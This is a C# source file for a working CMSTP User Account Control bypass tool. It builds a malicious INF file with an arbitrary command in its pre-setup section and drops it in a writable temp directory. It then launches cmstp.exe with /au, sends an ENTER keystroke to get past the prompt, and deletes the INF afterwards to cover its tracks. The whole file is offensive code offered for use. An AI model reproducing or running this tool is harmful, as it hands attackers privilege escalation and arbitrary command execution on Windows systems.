using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace CMSTPBypass
{
    class Program
    {
        public static string InfData = @"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""
";
        private static Boolean DirectoryExists(String directory)
        {
            if (Directory.Exists(directory))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        private static String GetWritableDirectory()
        {
            Logger.Print(Logger.STATUS.INFO, "Looking for writable directory...");
            string writableDirectory = "";
            foreach (String directory in new List<String> { "c:\\windows\\temp", "c:\\temp", "c:\\windows\\tasks", "c:\\users\\public" })
            {
                if (DirectoryExists(directory))
                {
                    Logger.Print(Logger.STATUS.DEBUG, "Found: " + directory);
                    writableDirectory = directory;
                    break;
                }
            }
            return writableDirectory;
        }

        public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

        public static string CreateConfigFile(string CommandToExecute)
        {
            string randomFileName = Guid.NewGuid().ToString("n").Substring(0, 8) + ".inf";
            string writableDirectory = GetWritableDirectory();
            if (writableDirectory == "")
            {
                Logger.Print(Logger.STATUS.ERROR, "Couldnt find writable directory!");
                return "";
            }
            StringBuilder configFile = new StringBuilder();
            configFile.Append(writableDirectory);
            configFile.Append("\\");
            configFile.Append(randomFileName);
            StringBuilder newInfData = new StringBuilder(InfData);
            newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
            try
            {
                File.WriteAllText(configFile.ToString(), newInfData.ToString());
            }
            catch (Exception e)
            {
                Logger.Print(Logger.STATUS.ERROR, e.Message);
            }
            return configFile.ToString();
        }
        public static Boolean CheckPrerequisites()
        {
            if (!File.Exists(BinaryPath))
            {
                Logger.Print(Logger.STATUS.ERROR, "CMSTP.EXE Exists: False");
                return false;
            }
            else
            {
                Logger.Print(Logger.STATUS.GOOD, "CMSTP.EXE Exists: True");
                Process[] cmstpProcesses = Process.GetProcessesByName("cmstp");
                
                if(cmstpProcesses.Length == 0)
                {
                    Logger.Print(Logger.STATUS.GOOD, "CMSTP.EXE Processes: " + cmstpProcesses.Length);
                    return true;
                }
                else
                {
                    foreach(Process p in cmstpProcesses)
                    {
                        Logger.Print(Logger.STATUS.ERROR, "CMSTP.EXE PID: " + p.Id);
                    }
                    return false;
                }
            }
        }
        public static void Cleanup(String configFile)
        {
            Logger.Print(Logger.STATUS.INFO, "Cleaning up...");
            try
            {
                File.Delete(configFile);
                Logger.Print(Logger.STATUS.GOOD, "File Deleted: True");
            }
            catch(Exception e)
            {
                Logger.Print(Logger.STATUS.ERROR, "File Deleted: False");
                Logger.Print(Logger.STATUS.DEBUG, "Error: " + e.Message);
            }
            return;
        }
        public static void Execute(string CommandToExecute)
        {
            if (!CheckPrerequisites())
            {
                return;
            }

            StringBuilder InfFile = new StringBuilder();
            String configFile = CreateConfigFile(CommandToExecute);
            InfFile.Append(configFile);

            Logger.Print(Logger.STATUS.INFO, "Payload: " + InfFile.ToString());
            Logger.Print(Logger.STATUS.DEBUG, "Config File: " + InfFile.ToString());
            Logger.Print(Logger.STATUS.DEBUG, "Command: " + CommandToExecute);

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath)
                {
                    Arguments = "/au " + InfFile.ToString(),
                    UseShellExecute = false
                };

                Process.Start(startInfo);
                Logger.Print(Logger.STATUS.INFO, "Process Started: True");
            }
            catch(Exception e)
            {
                Logger.Print(Logger.STATUS.INFO, "Process Started: False");
                Logger.Print(Logger.STATUS.DEBUG, "Error: " + e.Message);
                Cleanup(configFile);
                return;
            }

            IntPtr windowHandle = new IntPtr();
            windowHandle = IntPtr.Zero;

            while (windowHandle == IntPtr.Zero)
            {
                windowHandle = SetWindowActive("cmstp");
            }

            Logger.Print(Logger.STATUS.INFO, "Sending [ENTER] key...");
            try
            {
                System.Windows.Forms.SendKeys.SendWait("{ENTER}");
                Logger.Print(Logger.STATUS.GOOD, "[ENTER] Sent!");
            }
            catch(Exception e)
            {
                Logger.Print(Logger.STATUS.ERROR, "Failed sending keys: " + e.Message);
            }
            Cleanup(configFile);
            return;
        }

        public static IntPtr SetWindowActive(string ProcessName)
        {
            Process[] target = Process.GetProcessesByName(ProcessName);
            if (target.Length == 0)
            {
                Logger.Print(Logger.STATUS.ERROR, "Failed to get CMSTP.EXE");
                return IntPtr.Zero;
            }
            target[0].Refresh();
            IntPtr windowHandle = new IntPtr();
            windowHandle = target[0].MainWindowHandle;

            if (windowHandle == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            Logger.Print(Logger.STATUS.DEBUG, "Window Handle: " + windowHandle.ToInt64());
            try
            {
                NativeMethods.SetForegroundWindow(windowHandle);
            }
            catch
            {
                Logger.Print(Logger.STATUS.ERROR, "Call Failed: SetForeGroundWindow()");
                Logger.Print(Logger.STATUS.DEBUG, Logger.GetLastWindowsError());
            }
            try
            {
                NativeMethods.ShowWindow(windowHandle, 5);
            }
            catch
            {
                Logger.Print(Logger.STATUS.ERROR, "Call Failed: ShowWindow()");
                Logger.Print(Logger.STATUS.DEBUG, Logger.GetLastWindowsError());
            }
            return windowHandle;
        }
        public static void Main(string[] args)
        {
            if(args.Length != 1)
            {
                Logger.Print(Logger.STATUS.ERROR, "Usage: .\\" + AppDomain.CurrentDomain.FriendlyName + "<command to run>");
            }
            else
            {
                Execute(args[0]);
            }
        }
    }
}
